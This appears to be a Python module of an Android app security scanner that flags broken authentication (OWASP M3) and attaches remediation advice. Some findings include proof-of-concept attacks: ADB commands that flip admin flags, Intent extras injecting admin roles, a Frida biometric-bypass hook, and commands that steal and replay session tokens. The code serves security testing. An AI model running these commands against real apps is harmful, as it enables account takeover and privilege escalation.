"""
SKILL: Auth Breach [ACTIVE]
OWASP M3 — Insecure Authentication / Authorization

Detects client-side auth decisions, missing server-side validation patterns,
insecure token storage, biometric bypass vectors, and privilege escalation
through broken object-level authorization.
"""

import re
from typing import List
from appraisal.engine.base_module import BaseModule
from appraisal.engine.loader import AnalysisContext
from appraisal.models import Finding, CVSSVector, PoC, SkillType, Rank


class AuthModule(BaseModule):
    SKILL_NAME  = "Auth Breach"
    SKILL_TYPE  = SkillType.ACTIVE
    DESCRIPTION = "OWASP M3 — Broken auth/authorization: client-side checks, biometric bypass, token issues"

    def run(self, ctx: AnalysisContext) -> List[Finding]:
        self._findings = []
        self._check_client_side_auth(ctx)
        self._check_biometric_bypass(ctx)
        self._check_jwt_handling(ctx)
        self._check_session_management(ctx)
        self._check_intent_based_auth_bypass(ctx)
        self._check_webview_auth(ctx)
        return self._findings

    # ── Client-side authentication decisions ──────────────────────────────────

    def _check_client_side_auth(self, ctx: AnalysisContext):
        """
        Detect boolean flags used for auth gating that could be flipped.
        Pattern: isAdmin, isLoggedIn, isPremium in SharedPreferences or Intent extras.
        """
        AUTH_FLAGS = [
            "isAdmin", "is_admin", "isLoggedIn", "is_logged_in",
            "isPremium", "is_premium", "isAuthenticated", "is_authenticated",
            "hasAccess", "has_access", "isRoot", "isSuperUser",
            "isVerified", "is_verified", "isSubscribed", "userRole",
            "user_role", "accountType", "account_type",
        ]
        pool = " ".join(ctx.strings_pool)
        found_flags = [f for f in AUTH_FLAGS if f in pool]

        if found_flags and ("getBoolean" in pool or "getBooleanExtra" in pool
                            or "getStringExtra" in pool):
            self._add(Finding(
                id="M3-CLIENT-AUTH",
                title="Client-Side Authorization Flags Detected — Privilege Escalation Risk",
                category="Insecure Authentication/Authorization (M3)",
                description=(
                    "Authorization-sensitive boolean flags or role strings "
                    f"({found_flags[:5]}) are present in the DEX alongside "
                    "SharedPreferences.getBoolean() or Intent extra reads. "
                    "If access control decisions are made client-side by reading these values, "
                    "an attacker can trivially flip them using ADB, Frida, or "
                    "by sending a forged Intent with isAdmin=true."
                ),
                technical_detail=(
                    f"Auth flag names: {found_flags}\n"
                    "getBoolean/getBooleanExtra detected — client reads auth state locally."
                ),
                cvss=CVSSVector(AV="L", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N"),
                evidence=[f"Auth flag in DEX: {f}" for f in found_flags[:5]],
                affected_components=[ctx.package_name],
                remediation=(
                    "Never make authorization decisions based on client-stored values. "
                    "All access control must be enforced server-side with every API request. "
                    "The client can store display-only state, but never trust it for gating."
                ),
                pocs=[PoC(
                    type="adb_command",
                    title="Flip Auth Flag via SharedPreferences + ADB",
                    description="Escalate privileges by overwriting client-side auth flag",
                    code=(
                        f"# On rooted device — directly write admin flag\n"
                        f"adb shell su -c 'sqlite3 /data/data/{ctx.package_name}/databases/*.db "
                        f"\"UPDATE users SET isAdmin=1 WHERE id=1\"'\n\n"
                        f"# Or via SharedPreferences XML edit\n"
                        f"adb shell su -c 'sed -i s/isAdmin\\\" value=\\\"false/isAdmin\\\" value=\\\"true/ "
                        f"/data/data/{ctx.package_name}/shared_prefs/*.xml'\n\n"
                        f"# Or via Intent extra injection\n"
                        f"adb shell am start -n {ctx.package_name}/.MainActivity \\\n"
                        f"  --ez isAdmin true --ez isPremium true --es userRole admin"
                    ),
                )],
                references=["https://owasp.org/www-project-mobile-top-10/2023-risks/m3-insecure-authentication-authorization"],
                tags=["m3", "client-side-auth", "privilege-escalation", "authorization"],
            ))

    # ── Biometric authentication bypass ──────────────────────────────────────

    def _check_biometric_bypass(self, ctx: AnalysisContext):
        pool = " ".join(ctx.strings_pool)
        has_biometric = any(b in pool for b in [
            "BiometricPrompt", "FingerprintManager", "BiometricManager",
            "authenticate", "onAuthenticationSucceeded",
        ])

        if not has_biometric:
            return

        # Check for weak implementation: no CryptoObject used
        has_crypto_object = "CryptoObject" in pool

        if not has_crypto_object:
            self._add(Finding(
                id="M3-BIOMETRIC-NOCRYPTO",
                title="Biometric Auth Without CryptoObject — Bypass via Frida",
                category="Insecure Authentication/Authorization (M3)",
                description=(
                    "Biometric authentication is implemented without a CryptoObject. "
                    "Without binding authentication to a cryptographic operation, "
                    "the biometric check is purely UI-level. "
                    "A Frida script can directly call onAuthenticationSucceeded() "
                    "without triggering actual fingerprint/face verification, "
                    "bypassing the lock screen entirely."
                ),
                technical_detail=(
                    "BiometricPrompt used but no CryptoObject detected. "
                    "Secure pattern: BiometricPrompt.authenticate(CryptoObject(cipher), ...) "
                    "where the cipher is backed by an Android Keystore key with "
                    "setUserAuthenticationRequired(true)."
                ),
                cvss=CVSSVector(AV="L", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N"),
                evidence=["BiometricPrompt without CryptoObject in DEX"],
                affected_components=[ctx.package_name],
                remediation=(
                    "Bind biometric auth to a Keystore-backed CryptoObject: "
                    "1. Generate key with setUserAuthenticationRequired(true). "
                    "2. Create Cipher initialized with the key. "
                    "3. Pass BiometricPrompt.CryptoObject(cipher) to authenticate(). "
                    "This makes bypass require hardware-level compromise."
                ),
                pocs=[PoC(
                    type="frida_script",
                    title="Biometric Authentication Bypass",
                    description="Hook onAuthenticationSucceeded to bypass fingerprint check",
                    code=(
                        f"// Appraisal: DEX — Biometric Bypass\n"
                        f"// frida -U -f {ctx.package_name} -l biometric_bypass.js --no-pause\n\n"
                        f"Java.perform(function() {{\n"
                        f"  // Method 1: Hook BiometricPrompt.AuthenticationCallback\n"
                        f"  try {{\n"
                        f"    var AuthCallback = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');\n"
                        f"    AuthCallback.onAuthenticationSucceeded.implementation = function(result) {{\n"
                        f"      console.log('[+] Biometric bypass triggered');\n"
                        f"      this.onAuthenticationSucceeded(result);\n"
                        f"    }};\n"
                        f"  }} catch(e) {{}}\n\n"
                        f"  // Method 2: Hook AndroidX BiometricPrompt\n"
                        f"  try {{\n"
                        f"    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');\n"
                        f"    BiometricPrompt.onAuthenticationSucceeded.implementation = function(result) {{\n"
                        f"      console.log('[+] AndroidX Biometric bypass triggered');\n"
                        f"      this.onAuthenticationSucceeded(result);\n"
                        f"    }};\n"
                        f"  }} catch(e) {{}}\n\n"
                        f"  // Method 3: Hook FingerprintManager (legacy)\n"
                        f"  try {{\n"
                        f"    var FPCallback = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationCallback');\n"
                        f"    FPCallback.onAuthenticationSucceeded.implementation = function(result) {{\n"
                        f"      console.log('[+] FingerprintManager bypass triggered');\n"
                        f"      this.onAuthenticationSucceeded(result);\n"
                        f"    }};\n"
                        f"  }} catch(e) {{}}\n\n"
                        f"  console.log('[*] Biometric bypass hooks installed');\n"
                        f"}});"
                    ),
                )],
                tags=["m3", "biometric", "bypass", "authentication"],
            ))

    # ── JWT handling ──────────────────────────────────────────────────────────

    def _check_jwt_handling(self, ctx: AnalysisContext):
        pool = " ".join(ctx.strings_pool)
        jwt_patterns = [
            ("none", "JWT 'none' Algorithm Accepted",
             "JWT with algorithm 'none' disables signature verification"),
            ("HS256", None, None),
            ("RS256", None, None),
        ]

        has_jwt = "eyJ" in pool or "JWT" in pool or "JsonWebToken" in pool

        if not has_jwt:
            return

        # Check for dangerous 'none' alg
        if '"alg":"none"' in pool or '"alg": "none"' in pool or "alg=none" in pool.lower():
            self._add(Finding(
                id="M3-JWT-NONE",
                title="JWT 'none' Algorithm — Signature Verification Disabled",
                category="Insecure Authentication/Authorization (M3)",
                description=(
                    "The string 'alg:none' or equivalent was found in the DEX pool. "
                    "A JWT with algorithm 'none' has no cryptographic signature. "
                    "If the server accepts JWTs with alg=none, any attacker can "
                    "craft arbitrary tokens with any claims (including admin roles) "
                    "without knowing the signing key."
                ),
                technical_detail="'alg':'none' JWT pattern in DEX string pool.",
                cvss=CVSSVector(AV="N", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N"),
                evidence=['"alg":"none" in DEX pool'],
                affected_components=[ctx.package_name],
                remediation=(
                    "Reject JWTs with alg=none server-side. "
                    "Use a well-maintained JWT library that rejects none by default. "
                    "Whitelist only expected algorithms (RS256, ES256)."
                ),
                tags=["m3", "jwt", "none-algorithm", "authentication"],
            ))

        # Hardcoded JWT secret key
        hs256_secret = re.search(r'(?i)(jwt|secret)[_-]?key["\s:=]+([A-Za-z0-9+/=_\-]{16,})', pool)
        if hs256_secret:
            self._add(Finding(
                id="M3-JWT-SECRET",
                title="JWT Signing Secret Key Hardcoded in Binary",
                category="Insecure Authentication/Authorization (M3)",
                description=(
                    "A JWT signing secret key appears to be hardcoded in the binary. "
                    "Anyone who decompiles the APK can extract this key and forge "
                    "valid JWT tokens for any user, with any claims, with any role."
                ),
                technical_detail="JWT secret key pattern found in DEX string pool.",
                cvss=CVSSVector(AV="N", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N"),
                evidence=["JWT secret key pattern in DEX pool"],
                affected_components=[ctx.package_name],
                remediation=(
                    "JWT signing keys must never be embedded in client apps. "
                    "Sign JWTs server-side only. "
                    "The client receives and presents tokens — it never signs them."
                ),
                tags=["m3", "jwt", "hardcoded-secret", "authentication"],
            ))

    # ── Session management ────────────────────────────────────────────────────

    def _check_session_management(self, ctx: AnalysisContext):
        pool = " ".join(ctx.strings_pool)

        # Detect session tokens stored insecurely
        if "SESSION" in pool.upper() or "session_id" in pool.lower():
            if "getSharedPreferences" in pool and not "EncryptedSharedPreferences" in pool:
                self._add(Finding(
                    id="M3-SESSION-STORAGE",
                    title="Session Token Stored in Unencrypted SharedPreferences",
                    category="Insecure Authentication/Authorization (M3)",
                    description=(
                        "Session identifiers or tokens appear to be stored in "
                        "unencrypted SharedPreferences. "
                        "On rooted devices or via ADB backup, session tokens can be extracted "
                        "and used for session hijacking — allowing an attacker to impersonate "
                        "the authenticated user on the backend without knowing credentials."
                    ),
                    technical_detail=(
                        "SESSION/session_id strings + getSharedPreferences() in DEX.\n"
                        "EncryptedSharedPreferences not detected."
                    ),
                    cvss=CVSSVector(AV="P", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N"),
                    evidence=["Session token + SharedPreferences in DEX"],
                    affected_components=[ctx.package_name],
                    remediation=(
                        "Store session tokens in EncryptedSharedPreferences or Android Keystore. "
                        "Implement short token lifetimes with refresh tokens. "
                        "Invalidate sessions server-side on logout."
                    ),
                    pocs=[PoC(
                        type="adb_command",
                        title="Extract Session Token for Replay Attack",
                        description="Steal session token from SharedPreferences for account takeover",
                        code=(
                            f"# Rooted: read session token directly\n"
                            f"adb shell su -c 'grep -r session /data/data/{ctx.package_name}/shared_prefs/'\n\n"
                            f"# Replay stolen token against API\n"
                            f"curl -H 'Authorization: Bearer STOLEN_TOKEN' \\\n"
                            f"     -H 'X-Session-ID: STOLEN_SESSION' \\\n"
                            f"     https://api.target.com/v1/user/profile"
                        ),
                    )],
                    tags=["m3", "session", "token-storage", "authentication"],
                ))

    # ── Intent-based auth bypass ──────────────────────────────────────────────

    def _check_intent_based_auth_bypass(self, ctx: AnalysisContext):
        """Find activities that check auth via Intent extras rather than server-side."""
        BYPASS_PATTERNS = [
            "skipAuth", "skip_auth", "bypassLogin", "bypass_login",
            "forceLogin", "force_login", "autoLogin", "auto_login",
            "authenticated", "loggedIn", "logged_in",
        ]
        pool = " ".join(ctx.strings_pool)
        found = [p for p in BYPASS_PATTERNS if p in pool]

        # Check exported activities
        exported_acts = [c for c in ctx.components
                         if c.component_type == "activity" and c.exported]

        if found and exported_acts:
            self._add(Finding(
                id="M3-INTENT-AUTH-BYPASS",
                title="Potential Intent-Based Auth Bypass via Exported Activity",
                category="Insecure Authentication/Authorization (M3)",
                description=(
                    f"Auth-bypass strings ({found[:3]}) co-exist with exported Activities. "
                    "If authentication can be skipped by passing a flag via Intent, "
                    "any app on the device can launch the authenticated state directly "
                    "by sending a crafted Intent — bypassing the login screen entirely."
                ),
                technical_detail=(
                    f"Bypass flags: {found}\n"
                    f"Exported activities: {[c.name for c in exported_acts[:3]]}"
                ),
                cvss=CVSSVector(AV="L", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N"),
                evidence=[f"Bypass flag: {f}" for f in found[:3]],
                affected_components=[c.name for c in exported_acts[:3]],
                remediation=(
                    "Remove all auth bypass flags from production code. "
                    "Authentication state must be verified server-side, not via Intent parameters. "
                    "Add android:exported=\"false\" to all non-entry-point activities."
                ),
                pocs=[PoC(
                    type="adb_command",
                    title="Attempt Auth Bypass via Intent Flags",
                    description="Try all bypass flags against exported activities",
                    code=(
                        "\n".join(
                            f"adb shell am start -n {ctx.package_name}/{act.name} \\\n"
                            f"  --ez skipAuth true --ez loggedIn true --es userRole admin"
                            for act in exported_acts[:3]
                        )
                    ),
                )],
                tags=["m3", "auth-bypass", "intent", "exported-activity"],
            ))

    # ── WebView auth token exposure ───────────────────────────────────────────

    def _check_webview_auth(self, ctx: AnalysisContext):
        pool = " ".join(ctx.strings_pool)
        if "CookieManager" in pool and ("token" in pool.lower() or "auth" in pool.lower()):
            self._add(Finding(
                id="M3-WEBVIEW-AUTH",
                title="Auth Tokens May Be Accessible via WebView CookieManager",
                category="Insecure Authentication/Authorization (M3)",
                description=(
                    "CookieManager is used alongside authentication-related strings. "
                    "WebView cookies (including auth session cookies and tokens) are accessible "
                    "to JavaScript running in the WebView via document.cookie. "
                    "If the WebView loads untrusted URLs or has JavaScript enabled, "
                    "a malicious page can steal all session cookies."
                ),
                technical_detail="CookieManager + auth strings in DEX.",
                cvss=CVSSVector(AV="N", AC="L", PR="N", UI="R", S="U", C="H", I="N", A="N"),
                evidence=["CookieManager + auth strings in DEX"],
                affected_components=[ctx.package_name],
                remediation=(
                    "Set HttpOnly flag on session cookies server-side. "
                    "Use CookieManager.setAcceptThirdPartyCookies(false). "
                    "Only load trusted HTTPS URLs in WebViews handling auth. "
                    "Consider using custom headers instead of cookies for API auth in WebViews."
                ),
                tags=["m3", "webview", "cookie", "session-hijacking"],
            ))
